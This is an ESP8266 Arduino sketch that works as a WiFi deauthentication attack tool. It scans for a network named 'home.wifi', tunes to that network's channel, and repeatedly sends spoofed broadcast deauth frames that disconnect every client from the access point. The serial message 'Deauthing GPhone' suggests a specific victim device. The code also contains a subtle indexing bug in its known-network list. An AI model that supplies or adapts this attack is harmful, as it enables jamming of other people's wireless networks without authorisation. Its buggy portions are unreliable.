#include <ESP8266WiFi.h>

extern "C" {
#include "user_interface.h"
}

#define NUMNET 30

uint8_t numNetworks = 0;
uint8_t knownMACS[NUMNET * 6];
bool found;
uint8_t targetMAC[6];
uint8_t packetSize;

uint8_t deauthPacket[26] = {
/*0 - 1*/  0xC0, 0x00, // Frame Control
/*2 - 3*/  0x3A, 0x01, // Duration
/*4 - 9*/  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
/*10 - 15*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
/*16 - 21*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
/*22 - 23*/  0xFF, 0xFF, // Fragment & Sequence number
/*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
};

void snifferCallback(uint8_t *buf, uint16_t len) {
  Serial.println("Packet received!"); 
}

void setup() {
  Serial.begin(115200);
  Serial.println("");
  Serial.println("Deauthing GPhone");
  found = false;

  // Set WiFi to station mode and disconnect from any AP
  // WiFi.mode(WIFI_STA);
  // wifi_promiscuous_enable(1);
  // delay(100);

  wifi_set_promiscuous_rx_cb(snifferCallback);
  wifi_promiscuous_enable(1);

  delay(100);
  
  Serial.printf("Free heap: %d bytes\n", ESP.getFreeHeap());

  packetSize = sizeof(deauthPacket);

  packetSize = sizeof(deauthPacket);
}

void loop() {
  if(!found){
    Serial.println("Trying to find target...");
    findNewNetworks();
  }else{
    Serial.println("Deauthing...");
    deauthAttack(targetMAC);
  }
  
  delay(20);
}

void deauthAttack(uint8_t* apMac) {
  uint8_t newPacket[packetSize];
  memcpy(newPacket, deauthPacket, packetSize);

  memcpy(&newPacket[10], apMac, 6);
  memcpy(&newPacket[16], apMac, 6);

  for (int i = 0; i < 5; i++) {
    if(wifi_send_pkt_freedom(newPacket, 26, 0) != 0){
      Serial.print(".");
    }else{
      Serial.print("!");
    }
    delay(20);  // Adjust delay as needed
  }
}
void findNewNetworks(){
  uint8_t foundNetworks = WiFi.scanNetworks();

  // loop all found networks
  for (uint8_t i = 0; i < foundNetworks; i++){
    
    uint8_t* newMAC = WiFi.BSSID(i);
    bool newNetwork = true;

    // if any found networks have been seen before
    for (uint8_t k = 0; k < numNetworks; k++){
      if(memcmp(newMAC, &(knownMACS[k*6]), 6) == 0){
        newNetwork = false;
        break;
      }
    }

    // new network confirmed, add to list of known networks
    if(newNetwork){
      if (numNetworks < NUMNET) {
          memcpy(&knownMACS[numNetworks * numNetworks], newMAC, 6);
          numNetworks++;
        }

      if(WiFi.SSID(i) == "home.wifi"){
        Serial.println("Network found");
        Serial.printf("Mac Address: %s\n", WiFi.BSSIDstr(i).c_str());
        Serial.printf("Wifi Channel: %d\n", WiFi.channel(i));

        found = true;
        memcpy(targetMAC, newMAC, 6);
        wifi_set_channel(WiFi.channel(i));//same channel as target AP
        
        break;
      }
    }
  }
}